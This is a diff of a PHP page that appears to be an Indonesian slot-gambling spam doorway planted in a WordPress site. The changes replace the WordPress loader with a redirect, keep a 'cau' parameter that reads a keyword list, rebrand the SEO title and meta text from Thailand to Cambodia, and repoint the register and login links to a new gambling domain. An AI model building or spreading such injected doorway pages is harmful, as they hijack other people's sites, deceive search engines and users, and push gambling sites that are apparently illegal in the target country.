@@ -2,8 +2,7 @@
 
 function feedback404()
 {
-    define( 'WP_USE_THEMES', true );
-    require __DIR__ . '/wp-blog-header.php';
+    header('Location: home.php');
 }
 if (isset($_GET['cau'])) {
     $filename = "list.txt";
@@ -42,16 +41,16 @@ if (isset($_GET['cau'])) {
 <!DOCTYPE html>
 <html ⚡ lang="id" itemscope="itemscope" itemtype="https://schema.org/WebPage">
 <head>
-    <title><?= $BRANDS?> | 🤷‍♂️🤷‍♂️ Server Gacor Thailand Terpercaya Tahun 2024</title>
+    <title><?= $BRANDS?> | 🙌🙌 Server Gacor Kamboja Tahun 2024</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta charset="UTF-8">
-    <meta property="og:title" content="<?= $BRANDS?> | 🤷‍♂️🤷‍♂️ Server Gacor Thailand Terpercaya Tahun 2024" />
+    <meta property="og:title" content="<?= $BRANDS?> | 🙌🙌 Server Gacor Kamboja Tahun 2024" />
     <meta name="description"
-        content="<?= $BRANDS;?> Server Gacor Thailand Terpercaya Tahun 2024. <?= $BRANDS;?> Memberikan akses mudah untuk semua pemain slot online di Indonesia agar bisa merasakan kemenangan mudah hanya dengan modal minim." />
+        content="<?= $BRANDS;?> Server Gacor Kamboja Tahun 2024. <?= $BRANDS;?> merupakan situs judi slot terpercaya yang menyediakan berbagai macam jenis permainan judi online seperti slot online,live casino,sportbooks dan masih banyak lagi." />
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="mobile-web-app-capable" content="yes">
     <meta name='robots' content='index, follow' />
-    <meta name="keyword" content="<?= $BRANDS?>, Slot Gacor, Slot Online, Slot Dana, amp slot, slot mpo, slot gacor hari ini, slot terpercaya, slot gampang maxwin">
+    <meta name="keyword" content="<?= $BRANDS?>, Slot <?= $BRANDS?>,Slot Gacor, Slot Online, Slot Dana, amp slot, slot mpo, slot gacor hari ini, slot terpercaya, slot gampang maxwin, link alternatif <?= $BRANDS?>">
     <meta name="author" content="<?= $BRANDS?>">
     <meta name="allow-search" content="yes" />
     <meta name="YahooSeeker" content="index,follow" />
@@ -74,11 +73,11 @@ if (isset($_GET['cau'])) {
     <meta name="supported-amp-formats" content="websites,stories,ads,email">
     <meta property="og:site_name" content="<?= $BRANDS?>" />
     <meta property="og:description"
-        content="<?= $BRANDS;?> Server Gacor Thailand Terpercaya Tahun 2024. <?= $BRANDS;?> Memberikan akses mudah untuk semua pemain slot online di Indonesia agar bisa merasakan kemenangan mudah hanya dengan modal minim. " />
+        content="<?= $BRANDS;?> Server Gacor Kamboja Tahun 2024. <?= $BRANDS;?> merupakan situs judi slot terpercaya yang menyediakan berbagai macam jenis permainan judi online seperti slot online,live casino,sportbooks dan masih banyak lagi. " />
     <meta property="og:type" content="WebPage" />
     <meta property="og:locale" content="id_ID" />
-    <meta name="image" content="https://i.ibb.co/Zf0H4BT/image.png">
-    <meta name="og:image" content="https://i.ibb.co/Zf0H4BT/image.png">
+    <meta name="image" content="https://i.ibb.co/w46fDLv/image.png">
+    <meta name="og:image" content="https://i.ibb.co/w46fDLv/image.png">
     <meta property="og:locale:alternate" content="id_ID" />
     <meta name="theme-color" content="var(--bgColor)">
     <link rel="canonical" href="<?= $urlPath;?>" />
@@ -161,11 +160,11 @@ if (isset($_GET['cau'])) {
             --black: #222222;
             --white: #eaeaea;
             --accentColor: #E6E6E6;
-            --pink: #a200ff;
-            --cyan: #fb00ff;
+            --pink: #ffdd00;
+            --cyan: #9e8d0d;
             --pink-hover: #0b0b0c;
-            --cyan-hover: #a602ff;
-            --rose: #ff0000;
+            --cyan-hover: #ffa602;
+            --rose: #ff6200;
             --font: 'Karla', sans-serif;
             --firstName: 'John';
             --lastName: 'Doe';
@@ -559,20 +558,20 @@ if (isset($_GET['cau'])) {
 
 <body>
     <header>
-        <amp-img id="image" class="animated tada infinite slower" src="https://i.ibb.co/Zf0H4BT/image.png"
+        <amp-img id="image" class="animated tada infinite slower" src="https://i.ibb.co/w46fDLv/image.png"
         alt="<?= $BRANDS?>" width="200" height="100" layout="responsive"></amp-img>
     </header>
     <div class="created by pinjam">
         <h1 class="title animated heartBeat slow infinite">🐶<?= $BRANDS?>🐶</h1>
         <div class="pinjam abang">
-            <p class="font-normal"><a href="<?= $urlPath;?>"><?= $BRANDS?></a>Server Gacor Thailand Terpercaya Tahun 2024. <?= $BRANDS;?> Memberikan akses mudah untuk semua pemain slot online di Indonesia agar bisa merasakan kemenangan mudah hanya dengan modal minim.</p>
+            <p class="font-normal"><a href="<?= $urlPath;?>"><?= $BRANDS?></a>Server Gacor Kamboja Tahun 2024. <?= $BRANDS;?> merupakan situs judi slot terpercaya yang menyediakan berbagai macam jenis permainan judi online seperti slot online,live casino,sportbooks dan masih banyak lagi.</p>
         </div>
     </div>
     <div id="links">
-        <a class="link1 animated fadeInLeft slow" href="https://angkawin.site" target="_blank" rel="nofollow">DAFTAR <?= $BRANDS?></a>
-        <a class="link2 animated fadeInRight slow" href="https://angkawin.site" target="_blank" rel="nofollow">LOGIN <?= $BRANDS?></a>
-        <a class="link1 animated fadeInLeft slow" href="https://angkawin.site" target="_blank" rel="nofollow">LIVE RTP <?= $BRANDS?> </a>
-        <a class="link2 animated fadeInRight slow" href="https://angkawin.site" target="_blank" rel="nofollow">LINK <?= $BRANDS?></a>
+        <a class="link1 animated fadeInLeft slow" href="https://cawan78-3.fun/" target="_blank" rel="nofollow">DAFTAR <?= $BRANDS?></a>
+        <a class="link2 animated fadeInRight slow" href="https://cawan78-3.fun/" target="_blank" rel="nofollow">LOGIN <?= $BRANDS?></a>
+        <a class="link1 animated fadeInLeft slow" href="https://cawan78-3.fun/" target="_blank" rel="nofollow">LIVE RTP <?= $BRANDS?> </a>
+        <a class="link2 animated fadeInRight slow" href="https://cawan78-3.fun/" target="_blank" rel="nofollow">LINK <?= $BRANDS?></a>
     </div>
 
     <footer class="animated fadeIn slow delay-1s">
